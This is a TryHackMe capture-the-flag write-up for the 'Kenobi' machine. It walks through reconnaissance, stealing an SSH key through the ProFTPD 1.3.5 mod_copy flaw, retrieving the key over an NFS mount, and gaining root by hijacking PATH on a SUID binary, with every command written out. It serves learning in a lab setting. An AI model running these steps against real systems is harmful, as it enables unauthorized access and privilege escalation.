# Kenobi — TryHackMe — ROOT

**Date:** 2026-09-01
**Platform:** TryHackMe
**Outcome:** user + root
**Tools:** nmap, smbclient, netcat, showmount/mount (NFS), ssh

---

## Scheme (fixed for every writeup)

0. TL;DR chain
1. Recon — commands, key output, and a "means → therefore" line per finding
2. Foothold (user) — each step: did / why / result
3. Privilege escalation (root) — same shape
4. Misses and dead ends — the honest list
5. Lessons — max 3 reflexes to install

---

## 0. TL;DR chain

nmap (445 + 21 + 2049) → smbclient anonymous share → log.txt → ProFTPD 1.3.5 mod_copy →
key copied to /var/tmp → NFS mount of /var → SSH with stolen key → user →
SUID /usr/bin/menu + PATH hijack → root

## 1. Recon

`nmap 10.113.172.52` then `nmap -sV 10.113.172.52`:

| Port | Service | Means | Therefore |
|---|---|---|---|
| 21 | ProFTPD 1.3.5 | version with known mod_copy flaw | file-copy primitive later |
| 22 | OpenSSH 8.2p1 | login service | needs a credential or key |
| 80 | Apache 2.4.41 | web | enumerate if other paths stall |
| 139/445 | Samba smbd 4 | SMB shares | list shares, test anonymous |
| 2049 | NFS 3-4 | something is exported | check `showmount -e` |

**Note:** `nmap --script=smb-enum-shares` returned **nothing**. Empty script output is a
statement about the tool, not the target. The native client answered in one second.

## 2. Foothold (user)

1. **Did:** `smbclient -L //10.113.172.52 -N`
   **Why:** SMB open; first question is always "what does it give for free?"
   **Result:** 3 shares — print$, anonymous, IPC$.

2. **Did:** `smbclient //10.113.172.52/anonymous -N`, `ls`, `get log.txt`
   **Why:** an anonymous share with files is a gift; read everything.
   **Result:** log.txt shows kenobi creating an SSH key and mentions ProFTPD.
   Hypothesis: a private key exists at /home/kenobi/.ssh/id_rsa, and ProFTPD is the
   exfiltration path.

3. **Did:** `nc 10.113.172.52 21`, then:
   `SITE CPFR /home/kenobi/.ssh/id_rsa` → 350,
   `SITE CPTO /var/tmp/id_rsa` → 250
   **Why:** ProFTPD 1.3.5 mod_copy copies arbitrary files as the daemon, unauthenticated.
   **Result:** private key copied into /var/tmp.

4. **Did:** `showmount -e 10.113.172.52` → `/var *`;
   `mkdir /mnt/kenobi; mount -t nfs 10.113.172.52:/var /mnt/kenobi`
   **Why:** port 2049 + a file placed under /var = pick it up over NFS.
   **Result:** /mnt/kenobi/tmp/id_rsa in hand.

5. **Did:** `ssh -i id_rsa kenobi@10.113.172.52`
   **Result:** shell. user.txt read.

## 3. Privilege escalation (root)

1. **Did:** SUID hunt — `find / -perm -4000 2>/dev/null`
   **Result:** `/usr/bin/menu` stands out: not a standard binary, owned root, SUID.

2. **Did:** ran `menu`; three options, each launching a program **by short name** (curl among them).
   **Why it's the hole:** a SUID binary calling a program by name resolves that name through
   **my** PATH. I control PATH.

3. **Did:**
   `cd /tmp` ; `echo /bin/sh > curl` ; `chmod 777 curl` ;
   `export PATH=/tmp:$PATH` ; `/usr/bin/menu` → option 1
   **Result:** my fake `curl` executes with the SUID owner's privileges → root shell. root.txt read.

## 4. Misses and dead ends

- `nmap --script=smb-enum-shares` empty → repeated it instead of changing tools. Lesson: empty
  answer = change the tool, not the repetition count.
- Typed `SITE CPRF` / `SITE CPFO` → server said 500; didn't read the code at first.
- Created fake `curl` in `/home/kenobi` while PATH pointed at `/tmp` → real curl ran, no shell.
  Copied commands carry invisible cwd assumptions.

## 5. Lessons

1. SMB open → native client, anonymous first. Scanner scripts can lie by silence.
2. A file dropped by enumeration (log.txt) is a map: read it as *instructions*, not flavor.
3. SUID binary + short-name child process = PATH hijack. Check `pwd` before trusting copied commands.
